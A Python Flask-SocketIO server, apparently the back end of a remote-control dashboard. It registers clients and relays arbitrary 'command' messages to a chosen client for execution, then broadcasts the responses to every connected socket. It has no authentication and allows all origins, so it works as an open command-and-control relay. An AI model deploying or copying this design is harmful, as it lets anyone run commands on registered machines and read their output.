import os
from flask import Flask, request, render_template, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import logging
import sys

# Detaylı loglama ayarları
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='.')
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True, async_mode='gevent')

connected_clients = {}

# Static dosyaları sunmak için
@app.route('/')
def index():
    try:
        logger.info("Ana sayfa isteği alındı")
        return render_template('dashboard.html')
    except Exception as e:
        logger.error(f"Ana sayfa yüklenirken hata: {str(e)}")
        return str(e), 500

# Template klasörü için özel rota
@app.route('/templates/<path:path>')
def send_template(path):
    try:
        logger.info(f"Template dosyası istendi: {path}")
        return send_from_directory('templates', path)
    except Exception as e:
        logger.error(f"Template dosyası gönderilirken hata: {path}, {str(e)}")
        return str(e), 404

@socketio.on('connect')
def handle_connect():
    try:
        logger.info(f"Yeni WebSocket bağlantısı: {request.sid}")
        emit('connection_response', {'status': 'success', 'sid': request.sid})
    except Exception as e:
        logger.error(f"WebSocket bağlantısında hata: {str(e)}")
        emit('error', {'error': str(e)})

@socketio.on('disconnect')
def handle_disconnect():
    try:
        logger.info(f"WebSocket bağlantısı koptu: {request.sid}")
        if request.sid in connected_clients:
            client_id = connected_clients[request.sid]
            logger.info(f"Client ID {client_id} bağlantısı koptu")
            del connected_clients[request.sid]
            emit('client_disconnected', {'client_id': client_id}, broadcast=True)
    except Exception as e:
        logger.error(f"WebSocket bağlantısı koparken hata: {str(e)}")

@socketio.on('register')
def handle_register(data):
    try:
        logger.info(f"Yeni kayıt isteği: {data}")
        if not isinstance(data, dict) or 'client_id' not in data:
            raise ValueError("Invalid registration data")
        
        client_id = data['client_id']
        connected_clients[request.sid] = client_id
        logger.info(f"Client ID {client_id} kaydedildi")
        
        emit('registration_successful', {'status': 'success', 'client_id': client_id})
        emit('client_connected', {'client_id': client_id}, broadcast=True)
    except Exception as e:
        logger.error(f"Kayıt işleminde hata: {str(e)}")
        emit('error', {'error': str(e)})

@socketio.on('command')
def handle_command(data):
    try:
        logger.info(f"Komut alındı: {data}")
        if not isinstance(data, dict) or 'command' not in data or 'target_id' not in data:
            raise ValueError("Invalid command data")
        
        command = data['command']
        target_id = data['target_id']
        
        # Hedef client'ı bul
        target_sid = None
        for sid, client_id in connected_clients.items():
            if client_id == target_id:
                target_sid = sid
                break
        
        if target_sid:
            logger.info(f"Komut gönderiliyor: {command} -> {target_id}")
            emit('execute', {'command': command}, room=target_sid)
        else:
            raise ValueError(f"Target client {target_id} not found")
    except Exception as e:
        logger.error(f"Komut işlenirken hata: {str(e)}")
        emit('error', {'error': str(e)})

@socketio.on('response')
def handle_response(data):
    try:
        logger.info(f"Yanıt alındı: {data}")
        emit('command_response', data, broadcast=True)
    except Exception as e:
        logger.error(f"Yanıt işlenirken hata: {str(e)}")
        emit('error', {'error': str(e)})
